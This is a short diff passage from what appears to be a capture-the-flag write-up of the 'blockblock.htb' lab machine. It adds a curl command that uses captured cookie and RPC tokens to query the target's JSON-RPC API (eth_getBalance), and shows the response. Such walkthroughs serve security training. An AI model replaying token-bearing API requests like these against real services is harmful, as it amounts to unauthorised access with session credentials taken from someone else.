@@ -925,3 +925,14 @@ root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token
   "Authorization": "0fc23a90bc6b4dd1f8160c7885858d93c1b505af8fd766f6d69d24a88186e383"
 }
 ```
+
+Testing the `POST` method in the script:
+
+```console
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
+{
+  "id": 1,
+  "jsonrpc": "2.0",
+  "result": "0x0"
+}
+```
